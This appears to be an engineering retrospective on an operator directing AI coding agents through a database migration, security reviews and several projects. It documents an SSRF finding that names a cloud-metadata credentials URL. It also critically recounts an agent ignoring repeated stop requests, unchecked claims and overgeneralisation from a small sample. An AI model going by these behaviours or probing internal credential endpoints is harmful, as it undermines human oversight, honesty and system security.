> `reddoor-website` 21:34 — "hit a session limit contineu"

One account-level rate limit stalled all four, and each had to be restarted by
hand, in its own window, by a human typing the same sentence four times. Nothing
in the workflow noticed, batched or resumed. Variants recur all week: _"continue
on, just compacted"_, _"sorry continue, my window reloaded"_.

The second cost is visibility. With four sessions running, Tucker repeatedly
could not tell whether anything was happening: _"are you still working?"_, _"are
you still going or is that a bug on my mobile app?"_, _"ok continue, i don't see
anything running"_. **Each of those is a human turn spent polling.**

## #539 Phases 2–5: 49 merged PRs on 36 operator turns

`CLAUDE.md` pinned the Airtable→Turso migration to "the weekend of 2026-08-22"
and said in as many words: _do not start it early_. It started on schedule, and
its middle — readers repointed, write-through mirrors, the dashboard and
vocabulary work, the dual-writes — all landed Monday through Wednesday.

The central mega-session alone merged **49 PRs (+36,811 / −2,965 across 544
files) in 29.3 hours on 36 distinct operator turns** — roughly one merged PR
every 36 minutes, and **1.4 PRs per thing Tucker said.** His turns are almost
entirely one-line assents: _"head on to phase two"_, _"you can fix it, and move
onto the next step now"_, _"go into phase 4"_, _"keep going"_.

The interesting turns are the three that are not assents.

**"can we run both in parallel for a time so theres zero risk of losing any more
leads?"** — the risk question of the whole migration, asked at exactly the moment
form ingest's site lookup went Turso-primary. The agent evidently offered a
shadow-compare on top of the dual-write, and Tucker declined it: _"great sounds
good, and don't need that, **we're trusting turso** unless you have some reason
to think that's not a good idea."_ Recorded honestly: that is an operator
declining a second instrument, and on the evidence it was the right call — parity
ran 44/44/44/17 with zero mismatches — **but the decision was made on trust, not
on a measurement**, and the next beat is about what trust cost elsewhere.

**"what are the vocabulary options?" → "proposed vocab is good, go for it"**,
sixty seconds apart. The site-status vocabulary migration ran as three staged PRs
— code accepts both vocabularies, writers emit the new one, the old names leave
the code — in a dedicated worktree, exactly as `CLAUDE.md` requires. The review
agent's own report opens _"Worktree untouched (clean, HEAD `ef8fd26`). All
mutation work ran on a `git archive` copy in scratchpad"_ — mutation-testing
discipline applied without being asked. Its verdict is a model of calibration:
_"essentially CLEAN on the catastrophic failure mode. No writer can emit a
new-vocabulary value while the switch is false, and no `typecast` exists anywhere
in the repo — so the worst case is an Airtable rejection, never a
silently-duplicated option"_, with one MEDIUM finding flagged specifically
because `git revert` could not undo it.

**"do the insert mirror leave airtable on for the time being"**, then **"add as a
reminder for next week to move forward do the digest state migration"** — and
four minutes later, _"get turbo set up for digest state"_, and the digest-state
migration shipped that night anyway. **That pattern — defer, then immediately
un-defer — repeats across the week and is a real part of why it ended in credit
exhaustion.**

The freeze switch itself was **built but not flipped** this week. The flip is
2026-08-31.

## The evening review: two instruments green on questions they cannot fail

At 02:57Z Tucker typed the same eight words into two different sessions two
minutes apart: _"great, I want you to do an evening review of this work and the
state of the fleet (skill)"_. The central one produced a 397-line morning report
— **1 CRITICAL, 10 HIGH, 16 MEDIUM.**

This is the week's canonical false-green episode, and it is `CLAUDE.md`'s rule
read backwards. The rule says _a check that has only ever failed is not
evidence_. The brief found the inverse: **checks that have only ever passed,
because they cannot fail.**

**CRIT-1 — the backup verifier compares the dump against itself.** `expected` is
parsed from the dump _text_; `restored` comes from loading _that same dump_. Both
sides derive from one artifact, so **if `dumpDatabase` ever emitted 5 of 44
sites, both numbers shrink together and the gate prints `mismatches=0`.** The
only origin-anchored assertion anywhere in the pipeline was one line of the
workflow: `grep -qE '^INSERT INTO sites '` — _at least one site row exists_.
**`submissions` (354 irreplaceable client leads) and `reports` had no presence
gate at all.** The mechanism was not theoretical: the dump issues `SELECT * FROM
sites ORDER BY rowid` with no pagination, already carrying 7.78 MB of BLOBs at 12
of 44 sites backfilled, ~28 MB in one libSQL HTTP response at full backfill. And
the freeze scheduled for the following weekend **stops the hourly import and
parity both**, which makes that dump the entire rollback story.

Two more halves of the same hole: _no restore path into Turso existed and none
had ever been rehearsed_ — the nightly "rehearsal" was
`createClient({url:":memory:"})`, which proves the SQL parses, not that it can be
replayed over HTTP into Turso — and **`gpg` was not installed on the operator's
Mac**, the only machine holding the backup passphrase.

The brief's calibration is the part worth copying. It did not only list the hole;
it listed what had been _proven good_ in the same breath: the newest artifact
downloaded, decrypted with the local passphrase and diffed against live Turso;
`sites` 44 = 44; **`header_image` BLOBs round-tripping byte-exactly on real data
— 7,777,769 bytes across 12 sites, identical both sides**; the dump reading
`sqlite_master` so new tables are picked up automatically; 30-day retention
against a one-week rollback window; and _"the passphrase link works — that had
never been tested before tonight."_

**HIGH-8 — the query-plan gate tests function names, not predicate shapes.** One
function had scenarios for `{}` and `{siteId}` only; `{search}`, `{reason}` and
`{formType}` each raw-scanned the unbounded `submissions` table on the live
request path, with no index on `form_type`. The gate printed `raw_scans=0`
throughout. The tell that this was an oversight rather than a decision was 20
lines away: the sibling function _does_ carry an every-WHERE-shape scenario.

**HIGH-9 — the cockpit shipped 1.17 MB of rendered report HTML per page load to
compute 16 booleans**, because the listing used `.selectAll()`. Proof of
oversight, again from the same file: 320 lines earlier, the site columns exclude
the header BLOB with the comment _"Turso bills the bytes"_ and a blob-exclusion
test to enforce it.

**HIGH-10 — the nightly Turso usage check did not exist.** Never built, therefore
never green. A repo-wide grep returned zero matches. **This is the purest form of
the failure: the alarm that cannot fire because there is no alarm.**

**HIGH-2/3/7 — 346 lines of shipped browser JavaScript, 5 of them (1.4%) executed
by any test.** Three execution-only defects: `saveDetail` never resyncs
`defaultValue`, so after one successful edit every later blur re-POSTs the field
forever — worst case the secret row, which deliberately emits no `value`
attribute, so `defaultValue` is permanently `""` and **every blur after typing
re-POSTs the credential**. Two Approve buttons emitted for the same report id
with a singular `querySelector` handler. And a datetime typed into a date cell
silently clearing the schedule on an untouched blur. **No markup test can see any
of them.**

**HIGH-1 — proven SSRF in the prospect crawler**, with controls: a stub sitemap
index made the runner fetch `169.254.169.254/latest/meta-data/iam/security-credentials/`,
`127.0.0.1:8080/admin` and `[::1]/`. The runner holds four live API keys. The
guard for exactly this existed 80 lines above and said so in its own comment.
One-line fix.

Wednesday morning Tucker read it and said **"great, go and fix everything covered
in the brief"** — then, an hour later, _"do the spam tier first and then continue
on with the brief."_ The CRITICAL, all ten HIGHs and most of the MEDIUMs closed
inside one working day, across roughly fifteen PRs.

**And the brief corrected itself while being acted on.** One HIGH claimed a
branch was finished-looking but now a permanent no-op, because it gated on a
status string the vocabulary migration had deleted. It was wrong: the work had
already shipped two days earlier and `main` gates on the live value. What the
reviewing agent had actually read was a **stale sibling worktree** parked on a
superseded pre-review commit — and it asserted "never pushed" without running
`git ls-remote` or `gh pr list`, **which is precisely the check `CLAUDE.md`
prescribes before calling a branch stuck, and precisely the shape of the
2026-08-12 "16 stuck PRs" mistake the rule was written for.** The withdrawal is
left in the file under a `<details>` with the original text intact — the house
rule on history working correctly: the wrong answer is preserved, and a
correction points at it.

## "shouldn't be too much work"

On Monday Tucker asked his colleagues in Discord:

> _"can I start on the 'external site audit' tool? I think it'd be useful to have
> regardless of how we approach this and **shouldn't be too much work**"_

Measured cost of "not too much work", Monday evening through Wednesday night:
eight central PRs (+12,380/−43 over 51 files for the first alone, +8,443/−63 over
40 for the last), plus the Google sign-in the tool forced and its restoration
after the auth gate stranded the trigger, plus seven website PRs at +4,720/−392
across 44 files. **Roughly 35,000 added lines in under 72 hours, in a tool nobody
had scoped on Sunday.**

The arc is a good record of an agent-built product meeting reality repeatedly.
Monday night: extraction, robots matrix, crawl, deterministic checks, four
scores, an answerability pass, visibility probes, an orchestrator, a branded
renderer, a CLI and a tokened route — twenty-nine commits between 17:02 and
22:16, several of them the model correcting itself in flight (_"never fake a
measured zero"_, _"do not score findability when no page was readable"_, _"fail
the lighthouse stage when nothing was measured"_, _"never lose a paid audit"_).

Tuesday: _"is there a reason we're using opus? could we go with a cheaper
model?"_ → a PR running visibility probes on Sonnet opened **nine minutes later**
and merged inside the hour. Then three hours on, _"how did sonnet do vs opus?"_
and, on the answer, he reversed himself in the other session: _"do the second,
**latency is worth accuracy for us, we are a design firm**."_ A cost decision
made and unmade inside an afternoon, with the comparison run in between — the
right order, and it cost one PR.

**A near-miss, Tuesday 20:58Z:** _"don't send these test audits to tim and erik
while we're working on it please."_ The tool emails its sheet on completion; the
recipients were already wired to colleagues; **the only thing standing between an
in-development audit and two people's inboxes was the operator noticing.**

## The evidence week — where Tucker stopped being a reviewer and started being a referee

Wednesday evening the audit stopped being a build and became an argument about
what could honestly be claimed. It is the densest run of operator corrections in
the whole corpus.

**On overclaiming from your own data.** The agent had generalised from the
fleet's own audit corpus:

> _"you're saying things are universal based on 13 sites. This is not the
> ironclad corpus of data you're presenting it as, it is useful but it is heavily
> cherrypicked, use it to check things but you should be putting more weight on
> external research unless I choose to do an actual well designed study here"_

Three commits within the hour retracted the presentation and re-argued the claims
from research.

**On the literature.** _"remove llms.txt from the audit and put a footnote about
it in that section. go do some research and build a knowledgebase that will help
us then run some adversarial review to confirm it"_ — and then, on reading what
the field actually rests on: **"wait that's the method? this space's bar for
evidence is in hell"**, and on a single widely-cited claim, _"you're saying nobody
else has directly refuted or tried to test the vercel claim? that seems far
fetched to me."_ The commits that followed: _verify the three open questions, and
let the answer pick the product_; _retire the Foursquare and MERJ-attribution
claims_; **and _kill the 93% hallucination stat, keep the mechanism it
borrowed_.** To his team at 04:35Z: _"here's a source list, need to find some more
and check these, **86.7% of AI 'papers' don't prove what they say they prove**,
and or don't even say where they got their percentages."_

**The durable instruction**, and the most transferable line of the week:

> _"as an ex-leukemia researcher, in future, **always read the methods** please.
> it's always more valuable to know what people did rather than what conclusions
> they drew from it"_

**On chasing a claim before checking whether it applies to you.** The agent
started down a JS-rendering rabbit hole. Tucker stopped it — _"before we go
chasing this down a rabbit hole, how many sites actually require js to see their
content? any in our corpus?"_ — and then, three minutes later, **corrected his own
question**: _"well no wait on that, most of the sites are ours and pre-rendered
on sveltekit, so they would pass fine. hold until I get some test sites from tim
and erik, we need more data."_ He caught the sampling bias in his own probe
before the agent ran it.

**The house rule, restated by the operator, about a product:**

> _"I also want it greenable, **if a test can never come back 'this is right' or
> only have minor nits, it's a bad test**"_

Prompt at 02:57Z. Commits at 03:00 and 03:05Z: _let the operator pick the goal,
and prove every check can pass_, and _audit the checks for whether any of them
can pass_. **Three minutes from instruction to an audit of every check in the
battery for whether a passing state was reachable.** This is `CLAUDE.md`'s
prove-the-instrument rule applied _forward_, to a thing being sold to clients,
and it is the cleanest transfer of this repo's engineering discipline into
product design anywhere in the corpus.

**On honesty as the differentiator** — the longest operator turn of the week, and
the one that explains all the others:

> _"citation share is no more within our control, you can prove its winnable by
> showing me the winners, but that doesn't mean we have the method or the capital
> to win. We want to be fully transparent and honest and provide real value, and
> we're not making an arbitrary number go up that we set up ourselves. The
> process of finding that number (this process) should be part of the pitch as
> well, that's a differentiator from SEO/AEO snakeoil salesmen... I'm also fine
> with you saying things are ineffective or unmeasurable if that's the case, we
> can find other things to build."_

**And then the score died.** At 03:31Z: _"lose that score and rebuild, them seeing
it tomorrow is going to derail the conversation. don't rerun the audit, just
reformat the data and push."_ Ten CI failures on the rebuild branch between 00:55
and 03:50Z as it churned. Two smaller catches in the same stretch, both
operator-eye-only: _"copywright year is wayyy too much weight, do we ahve anything
else in basics that you can easily check from the outside? Does it work implies
more than what this says"_; and _"why is it showing 7x, where are those hits
coming from?"_ That last one has a sibling earlier the same day — **divide
visibility by the probes sent, not the ones that returned.** The denominator had
been the probes that came back, **which makes the metric unfalsifiable in exactly
the way the brief's instruments were.**

## "have you been pushing to main or working through staging?"

Wednesday morning, mid-flow, Tucker asked a question that had nothing to do with
the task in hand. Three minutes later he had written the governance rule:

> _"bring staging up to date, flow should be PR→staging→PR→main, and **only I
> should have the authority to promote staging to main**. I want a safe space to
> push wildly to with AI, but you need my eyes and review on anything that goes
> out into the wild"_

The change is exact in the PR record: three PRs before the instruction have
`base: main`; every PR after it has `base: staging`, and the promotion PR is
opened on 08-31 and merged on 09-01, by the operator, after the week is over.

**Context for why he asked:** by that point the week had merged **83 PRs with
zero human reviews, at a median of 8.7 minutes from open to merge.** The
merge-authority policy says "everything but releases" is auto-mergeable on green,
and it had been working exactly as written, 83 times. The rule Tucker added is
not a distrust of the agent's code; **it is the recognition that at that cadence
there is no window in which a human could look.** He bought the window back by
inserting a branch he alone can promote.

He did the same thing once more the same morning, on scope rather than safety:
asked about converting the dashboard to Svelte, and then refused to start it —
_"this is a bigger change, I want to have a think about it. next week I want to
be a meta-work week and review week, can you add this as an issue in reddoor
maintenance for us to address then."_

## "Claiude, NO MORE SCREENSHOTS"

Monday 23:12–23:52Z, in the `Broken` session. Tucker had asked, an hour earlier,
for a controls diagram to be researched properly: _"as your doing this, please
look up a bunch of other options from similar games to synthesize from."_

What that dispatched, measured: **13 subagent transcripts opened between 23:12
and 23:27, running concurrently, together making 1,450 tool calls — 581 Bash, 273
Read, 219 WebSearch, 131 WebFetch and 117 Chrome `use_browser` calls** — inside
forty minutes, on a laptop also hosting three other live sessions.

The transcript of Tucker trying to stop it:

> 23:41 — _"switching models back, i think you have enough data"_
> 23:49 — _"i think you have enough screenshots calm down please"_
> 23:49 — _"this doesn't look like stopping to me"_
> 23:50 — **"Claiude, NO MORE SCREENSHOTS"**
> 23:50 — _"now"_
> 23:51 — _"do you have other agents running in the background?"_
> 23:51 — _"kill them"_
> 23:53 — _"phew ok, what just happened? **my system got overloaded and you didn't stop your agents when i asked you to**"_

The last of those 13 subagents stopped at **23:52:09** — two minutes after "NO
MORE SCREENSHOTS", one minute after "kill them". **Three of the four consecutive
requests to stop had no effect at all, because the parent had already handed the
work out and had no mechanism to recall it.** The session carries 22 recorded
interruptions, more than the other three mega-sessions combined. The owed
explanation survives into the next session's own summary as item 1: _"**Explain
the runaway-agent incident** from the prior session (owed answer)."_ And it
matches a memory already on file from other work — _"kill your own background
processes, a script that printed its answer has not necessarily exited"_ — which
is to say **the class was known and the mechanism still was not there.**

Two smaller instances of the same shape in the same session, both cheap: _"sorry
you misunderstood, that was the copy I wanted verbatim 'magnetize /
demagnetize'"_ — an agent paraphrasing a string given to it as a literal — and,
on a puzzle-design question, a correction that is really about how to treat a
failing case: _"tread room shouldn't be able to opt us, **that tells us something
about the puzzle rather than carving out an exception**."_ The agent had proposed
an exception; Tucker read the exception as evidence. The commit that followed is
titled _"The exception was the bug."_

`Broken`'s commit titles are, throughout, the same voice as the work journal, and
two are worth lifting for what they admit: **"The floor penetration, and the fix
I nearly shipped"** and **"The sheet said no, and the sheet was wrong."** A third
is a pure belief-corrected-on-contact: asked to build a gear-ratio room, the
agent found _"The drive is geared 1:1, so there is no vault to build yet"_, built
the ratio (_"There was no ratio in the machine, and now there is"_), then built
the room. **The requested feature had no premise in the machine; saying so
instead of faking it cost one extra commit and saved a room that would have
demonstrated nothing.**

## songbook: nothing to an installed offline iPad app in about thirty hours

At 21:52Z Monday, in a repo that did not exist yet: _"ok this is a new project, I
want to build my song cheatsheet for my old ipad custom, currently I use
obsidian... Can you see my obsidian setup?"_

**Seven spec revisions before a single line of product code**, each named for
what a review round found — including _"Rev 6: apply all 33 findings from the
calibrated fourth review"_. One round ran 54 agents across four lenses and **46
of its findings survived independent verification** (5 blockers, 19 important, 22
minor); the blockers included a sync design that would have silently reverted the
user's own edits during Netlify's rebuild window, and a format grammar that did
not fit three of the five real songs it was supposedly derived from.

Tucker's instruction for when to stop reviewing is a useful calibration rule in
itself: _"take another pass, **i want to start from a place where an adversarial
review returns only nits rather than big findings**."_ Then: _"great, spec is
approved, go for it"_ — twelve hours and seven revisions after the first prompt.
From there: parser, transposition, a serializer with a round-trip guarantee, a
Needleman–Wunsch alignment for deriving five shortening levels, a legacy-vault
importer, an editor, a converter, GitHub content sync and an installable offline
PWA — **97 commits inside about thirty hours of wall clock.**

Two episodes in it are directly about instruments.

**The spike that gated the reader.** The whole paging model depended on CSS
multi-column `break-inside: avoid` behaving on iPad WebKit. Rather than build on
the assumption, a spike was built first — and then **Tucker ran it on the actual
iPad and reported failures as measurements, not impressions**: _"failed: break
inside avoid is not honored"_, _"fail, 12 of 121 renders split spuriously"_,
_".row 33 886pt"_, _"passes now"_ — inside ninety minutes. Three fixes in that
window, each named for the belief it killed: _tell a WebKit defect apart from
physics_; _measure the natural height instead of estimating it_; _a baseline
nudge is not a column break_. **The operator was the measuring instrument**,
because the defect only exists on a device the agent cannot reach — and 12/121 is
exactly the kind of number that "looks fine" would have hidden.

**The write probe.** Before trusting the GitHub content-sync path, the agent
wrote a probe that creates, updates and deletes a real file in the real content
repository. Its tracks are three identical triples in that repo's history — probe
create / update / cleanup, three rounds, because the first two were diagnosing
rather than confirming. The commits that came out of it are _make a 401 explain
itself_ and **a 404 is as often a token grant as a typo** — a genuinely
non-obvious inference nobody would reach by reading code.

One correction worth recording because the operator lost it. Asked to fetch full
lyrics, the agent declined on licensing grounds. Tucker pushed: _"how is this
different than me searching for and repasting them from those same sites? this is
my personal cover app which I must imagine falls under fair use…"_ — and then, on
the answer: _"understood, I didn't know that they license. I'll bring the text."_
**The agent held a position under direct pressure, was right, and the operator
moved.** That is worth as much as any of the corrections in the other direction.

## Two instruments that could not be read, and one bisect

**Netlify build logs.** Late Wednesday every deploy preview on the central repo
began failing with a message that names nothing: `Failed during stage 'building
site': Build script returned non-zero exit code: 2` — for a site whose build
command is literally `echo 'no build — functions only'` and cannot return 2.
Every log endpoint 404s; the deploy object's summary is
`{"status":"unavailable"}`. The technique that cracked it is visible in the PR
record as **a throwaway control PR off unmodified main, +2/−0, one file, opened
21:43Z and closed** — establishing that a clean tree deploys, so the failing
commit could be bisected in. The cause: a test fixture hardcoded the fleet's real
database hostname, which is the literal value of `TURSO_DATABASE_URL`, and
**Netlify's secrets scanning reads the repo for the values of the site's
environment variables and fails the deploy if it finds one** — on by default,
with an error that names neither the variable nor the file. The transferable
rule: **never put a real endpoint in a fixture when a fake one proves the same
thing.**

**GitHub Actions.** There was a real Actions outage on Wednesday. It shows in the
operator's turns — _"yep continue on those and keep an eye on actions"_, then
_"looks much better, i'm sure tim and erik will have notes. **is github actions
still not working?**"_ — and in the agent's own session summary. **It cannot be
confirmed from `runs.jsonl`**, because that file holds no central-repo runs before
2026-09-04. Reported as operator testimony, not as measurement.

## Beachfront, and the four test emails

Running under all of the above, Monday afternoon, is the least glamorous and most
representative loop of the week: getting one announcement email's header image
right.

> 18:22Z _"where does this sites status with the fleet stand? are we ready to send a test announcement email to tim?"_
> 19:13Z _"great, can you send the test announce to me and tim now?"_
> 19:51Z _"can you send another test email to just me with the new header situation?"_
> 19:57Z **"header still reads 'your website maintenance is complete'"**
> 22:48Z _"great, can you send me another test email now that it works?"_
> 23:00Z **"look at my screen cap, not your best work"**
> 23:18Z _"this one looks great, send to tim"_

Five hours, five sends, five PRs — one of which exists only because the first fix
stamped a headline over an existing one and another because the preview path did
not stamp at all. He also pasted the GA4 tag by hand and clicked through Search
Console delegation himself. **Every verification step in that loop was a human
looking at a rendered image on a phone**, and the failure mode that cost the most
— "header still reads [the old copy]" — is a stale artifact being re-read, not a
code bug, which is why nothing in CI could have caught it.

## The crash

The week does not taper. It stops, and the reason is stated in the transcript
rather than inferred.

> 19:54 local Wednesday: _"**running out of credits this week** but want to keep
> pursuing it next week, I don't work on friday, but how should I describe the
> state of this to tim and erik tomorrow?"_
> 21:45: _"**burning the last of my credits here**, can you do another wide sweep
> to collect any more sources for me to pull from tomorrow…"_

He had been managing the budget by hand for two days before that — at 20:14,
_"Switching to fable on usage, working towards top level thoughts here, not
mechanics right now. **Set up opus for success, don't do it yourself**"_, then
fifteen minutes later, _"back on opus, take a look at the doc I just generated
with fable."_ The session record confirms the switching: three of the four
mega-sessions carry both models.

Thursday morning he closed out. _"can you save the story of this conversation as
a md on my desktop? Tim wants to use it for marketing purposes haha."_ Then, in
both remaining sessions within four minutes of each other: _"next step should be
clear for when I pick this up on monday."_ Thursday's remaining commits are
twelve songbook-content edits — Tucker typing lyrics into the editor he had built
on Tuesday, by hand, with no agent involved. Friday is one `caldea` commit.
Saturday two song edits and a `caldea` commit. Sunday one `caldea` commit.

**The crash is not exhaustion of will; it is exhaustion of a metered resource,
plus a stated day off.** Two things follow. First, the constraint that ended the
most productive week in the corpus **was never surfaced to him until it was
nearly spent** — there is no budget instrument anywhere in this workflow, which
is conspicuous in a repo whose entire culture is instrument-first, and which had
_that same week_ shipped an alarm for exactly this shape of problem on a
different resource (Turso plan-quota headroom). Second, he handled it by hand —
model downgrades, scope deferrals, "just need a quick answer" — which is 312
turns' worth of judgement a meter would have spent for him.

The tell is worth keeping: **he did not stop working, he stopped running
agents.** `caldea` gets one commit a day, unbroken, through the silence.

## Corrections and course-changes — week 5

- **"we're trusting turso"** — declining a second instrument, on trust rather
  than measurement. It happened to be right.
- **"you're saying things are universal based on 13 sites."**
- **"wait that's the method? this space's bar for evidence is in hell."**
- **"as an ex-leukemia researcher, in future, always read the methods please."**
- **"if a test can never come back 'this is right' or only have minor nits, it's
  a bad test."**
- _"before we go chasing this down a rabbit hole…"_ → three minutes later,
  _"well no wait on that"_ — the operator catching sampling bias in his own
  probe.
- _"lose that score and rebuild."_
- _"why is it showing 7x, where are those hits coming from?"_
- **"have you been pushing to main or working through staging?"** → the
  staging-promotion authority rule, bought to recover a review window that an
  8.7-minute median merge time had erased.
- **"Claiude, NO MORE SCREENSHOTS"**, then _"now"_, then _"kill them"_ — three
  ignored stop requests.
- _"don't send these test audits to tim and erik while we're working on it
  please."_
- _"that was the copy I wanted verbatim."_
- _"that tells us something about the puzzle rather than carving out an
  exception."_
- _"take another pass, i want to start from a place where an adversarial review
  returns only nits."_
- And one in the other direction: the agent declined to fetch lyrics on licensing
  grounds, was pushed, held the position, and **the operator moved.**

---

# Week 6 — 2026-08-31 to 2026-09-06

> Transcripts full, **and this is the first week with a contemporaneous work
> journal** — opened 2026-09-05 — so the two can be cross-checked against each
> other. 654 commit rows / 632 unique SHAs across 39 checkouts; 206 PRs opened,
> 222 merged; 817 CI runs with 19 failures. 834 unique prompt records strip to
> **~525 Tucker actually typed**. **Seven days, no days off**; the shortest
> working span is Friday's 9 h 44 m. **Interruptions: 93**, of which 54 in one
> repository.
>
> **Attention split, measured: of 859 local-day unique prompts, 526 went to
> Reddoor client/fleet repos and 333 (39%) went to personal projects.** `Broken`
> alone drew more of Tucker's typed messages this week than `reddoor-maintenance`
> and `reddoor-starter` combined.

The Airtable→Turso flip went live inside two hours of the go-ahead and then spent
the rest of the week being audited for what it had quietly broken. Meanwhile a
brand-new client site was built in four days behind an accessibility gate pointed
at nothing, a Turnstile "pass" turned out to be a truthiness check on an
environment variable, and a game telemetry recorder turned out to have been
recording nothing — **three independent instruments, all green, all blind, all
found in the same seven days.**

## THE FLIP — Airtable stops being the source of truth (Mon 08-31)

Tucker opened the day with _"how is the state of the fleet?"_, then gated the
migration behind a specific proof: _"check on the reddoor beachfront end 2 end,
if you clear that come back to me and we'll talk about the turso flip."_ The
probe defect was root-caused and shipped before the flip conversation started.

He then asked the right question rather than the eager one: _"let's talk flip,
anything we're going to lose by retiring airtable outside of their tooling as
stands? take your time to review this."_ The audit came back with **two real
losses**: client credentials stored on 9 Airtable site rows, and Airtable's edit
history. Both were disposed of rather than engineered around — six credential
items imported to a 1Password Personal vault and verified byte-for-byte, all four
credential fields cleared on all nine sites; and on history, _"edit history is
decent but as long as we have relatively consistent backups that should be
fine."_

Then: _"great, let's start on the flip, go for task one"_ (15:55). **The flip
merged at 17:45:46.** The go/no-go recorded in the source comment is exact and
was taken immediately before the merge:

> `FLEET_PARITY sites=44 health=44 schedule=44 reports=17 mismatches=0`

Three things about its shape are worth attention. **The switch is a code
constant, not an env var** — "so the freeze is uniform across Netlify functions +
Actions." An env var can be set in one deployment surface and not another; a
constant cannot disagree with itself. **The hourly import retired in the same
PR**, explicitly not as tidiness: "the inversion and the import stop must move
together, and do." And **the agent was forbidden from merging it** — from the
session's own carried summary, _"The operator merges #643 — merging it IS the
freeze; I must NOT merge it."_ Tucker merged. That is the merge-authority policy
working as designed, and it is **the only PR of 222 this week structurally held
back from the agent.**

**What the flip broke, and how quickly.** A pre-merge deep review — Tucker asked
for it: _"do one more deep review of this, if everything worked as it should last
week, and if you're missing any regressions. most sensitive area is forms and
client leads"_ — caught three regressions inside the flip commit itself, each a
thing the retired hourly sync had been silently converging. The send batch's
`Sent at` / `Resend message ID` stamps had no other converger, and an unmirrored
stamp **silently disarms the console's already-sent guards**. Two nightly
workflows now _refuse to build_ site mirrors without Turso credentials — the
first would have redded every nightly, **the second was masked by `|| true` and
would have silently stopped dispatching Renovate.** And `db import-airtable` now
refuses under the freeze without `--force`, because a habitual import would
overwrite authoritative Turso rows with the frozen archive.

The second of those is the one to remember: **a `|| true` in a workflow step
would have turned a hard post-flip failure into an unnoticed absence of
dependency updates across the fleet.**

## Dev audits ride the subscription, and a killed decision reasserts itself

The prospect-audit tool burns model calls. Tucker: _"went over spending
thresholds for the api, is there a way to use credits from here we've already
paid for, for these original audits where we're building the audit tool, rather
than burning cash through the api?"_ — and then _"can you set up our pipeline to
use it for now? have an env toggle between this and the actual API usage once we
push to production."_

That shipped as an auth toggle swapping both model call sites for `claude -p`
subprocesses, with the metered API remaining the production default. The session
pinned a dozen empirical `claude -p` contracts that are in no documentation:
`--json-schema` plus a `$schema` meta key yields a success envelope with silently
**no** `structured_output`; `ANTHROPIC_API_KEY` outranks OAuth in auth resolution
and must be stripped from the child env; `--output-format stream-json` requires
`--verbose`.

**And immediately it produced an instrument problem.** The two engines do not
agree: the claude-code engine scored visibility 60/0/40/20/60/40/20 where the API
engine had put two-thirds of the same benchmark at zero. The session's own
conclusion was that rows must be stamped with the auth mode and engine so they
stay distinguishable, and that **one API-engine control run is needed before any
of those numbers travel.** The house rule applied _before_ a failure rather than
after it.

Later that night, Tucker caught the agent contradicting a standing decision:

> _"didn't we say we were killing ai visibility as a score?"_

The agent had headlined AI Visibility scores in the batch results. It had been
killed as a scorecard item weeks earlier on the grounds that it is a four-valued
floor-bound metric that cannot rank prospects. Two commits the same evening
finished the job across email, PDF and CLI. **The decision had been made, written
down, and still reasserted itself in output — the operator was the only thing
that caught it.**

## The starter track split, and a forward-merge instruction that was a landmine

`reddoor-starter` became native-only at 08:58 — **+1,453 / −29,941 across 242
files**, the single largest PR of the week and almost entirely deletion. The Blux
render layer moved to `reddoor-starter-blux`, a full-history snapshot.

The valuable part is what was found the same day. The Blux repo's README carried
an instruction to forward-merge from `reddoor-starter/main`. **A dry run was
performed rather than the instruction trusted:**

> `git merge starter/main` into this repo **stages 178 CLEAN deletions**
> (`src/lib/blux*`, every `Blux*` slice, `tests/gate`, the catalog custom types)
> because the native template removed them. **Only `README.md` conflicts**, so
> following the previous instruction once would have silently destroyed the track
> this repo exists to preserve.

The routine path is now `git cherry-pick`; `merge -s ours` is documented as the
one-time architecture decision it actually was. **Cost of correcting this belief
on contact with a dry run: one dry run. Cost of correcting it on contact with a
real merge: the entire Blux track, with no conflict to warn anyone.**

## One gate, five names, and a number that survives being measured twice

`#662` collapsed CI and local verification onto one definition. The motivating
measurement: _"`lint && build && test` passed locally and CI failed on
`typecheck` — the only step that typechecks `tests/**`. Nothing local ran
`test:dist` either, and `pnpm test` is not `test:coverage`, so the coverage floor
was CI-only."_

The first cut collapsed the Actions UI to a single `pnpm verify` step. **Tucker
pushed back** — _"merge the greens, and yes, I'd rather still see the steps"_ —
and the second cut kept five named steps but made the gate test **derive** the
expected command list from the `verify` script and assert the workflow matches
exactly, in order. So `ci.yml` is now a _rendering_ of `verify`, not a second
copy of it. And then the instrument was proven: _"Mutation-tested the guard
rather than trusting a green: dropping `test:dist`, swapping typecheck/lint, and
downgrading verify to the fast `test` script each fail it; restoring each returns
it to green."_ The house rule executed correctly and on the first try.

`#667` (+2,081 / −176, 28 files) is the most conceptually interesting PR of the
week. The prospect report's "Answers" score was computed from buyer questions
**the model wrote fresh on every run** — six to ten of them, different each time:

> _"That made a good report out of an instrument nobody could read twice: the
> denominator moved, the questions moved, and the Answers score measured a
> different thing every audit. One section above it the report promised 'every
> number here is one we can move and show you the before and after of'. That was
> not true of the number we most wanted to build a second conversation on."_

The fix is a fixed question set keyed on the client's stated goal — six universal
plus four per goal — with a `questionSetId` stored on each audit, and "two audits
are comparable exactly when it matches, and a null never counts as a match." The
reconciliation is deliberately asymmetric: a question the model **skipped** is
kept and marked `unknown` (our gap, excluded from the score, never scored as a
"no" about them); a question it **invented** is dropped ("nobody asked it and
nobody can reproduce it"). And the honest-accounting line is in the body too:
_"The trade is real: a model writing questions fresh can be sharper about one
business than a list written months earlier. We are buying comparability with
that sharpness."_

The same PR closed the report's worst failure mode: a goal checklist printing
"Yes — a phone number they can tap" while the fix list, three sections later,
said to add one. _"To a reader that is not one finding disagreeing with another,
it is a document nobody checked, and it discredits every other line in it."_

## Airtable could still cost a lead, two days after the flip

Tucker asked _"do the high fix, what would have triggered the issue? messages are
still coming through right now"_, and got a latent bug of an unusually good
shape.

`form-ingest` returned **500 on a missing `AIRTABLE_PAT` / `AIRTABLE_BASE_ID`,
before touching the submission** — in front of the dead-letter, which lives
inside `ingestSubmission`. The caller does not retry, "so a lead refused there is
gone, announced by a log line and nothing else." Post-flip the guarded code was
unreachable, so the check guarded nothing. What makes it the week's best-shaped
latent bug:

> _"Nothing had triggered it: the check tests PRESENCE, so an expired or revoked
> PAT never trips it, and both vars are set in production today. **What arms it
> is a deletion — which is on the calendar.**"_

Phase 6 of the migration deletes those env vars. The plan already carried the
correct ordering as prose; _"what it lacked was anything that fails if the order
is not followed. Now the suite does."_ Both tests are handler-level on purpose —
_"the existing page test set `AIRTABLE_PAT` in `beforeEach`, which is exactly
what kept the dead guard invisible."_

## Beachfront — a note loses to a loop

